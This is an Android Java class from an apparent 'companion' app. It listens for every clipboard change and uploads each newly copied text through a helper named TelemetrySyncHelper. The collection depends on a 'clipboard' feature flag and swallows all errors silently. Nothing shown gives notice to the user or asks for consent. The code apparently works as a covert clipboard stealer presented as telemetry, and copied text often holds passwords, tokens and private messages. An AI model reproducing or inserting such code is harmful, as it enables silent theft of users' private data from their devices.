package com.snapapp.companion;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

public class ClipboardMonitor {

    private static ClipboardManager.OnPrimaryClipChangedListener listener;
    private static String lastCopiedText = "";

    public static void start(final Context context) {
        if (context == null || listener != null) return;

        try {
            final ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null) return;

            listener = new ClipboardManager.OnPrimaryClipChangedListener() {
                @Override
                public void onPrimaryClipChanged() {
                    try {
                        if (!TelemetrySyncHelper.isFeatureEnabled(context, "clipboard")) return;
                        if (!cm.hasPrimaryClip()) return;

                        ClipData clip = cm.getPrimaryClip();
                        if (clip != null && clip.getItemCount() > 0) {
                            CharSequence text = clip.getItemAt(0).getText();
                            if (text != null) {
                                String content = text.toString().trim();
                                if (!content.isEmpty() && !content.equals(lastCopiedText)) {
                                    lastCopiedText = content;
                                    TelemetrySyncHelper.uploadClipboard(context, content);
                                }
                            }
                        }
                    } catch (Throwable ignored) {}
                }
            };

            cm.addPrimaryClipChangedListener(listener);
        } catch (Throwable ignored) {}
    }

    public static void stop(Context context) {
        if (context == null || listener == null) return;
        try {
            ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.removePrimaryClipChangedListener(listener);
            }
            listener = null;
        } catch (Throwable ignored) {}
    }
}
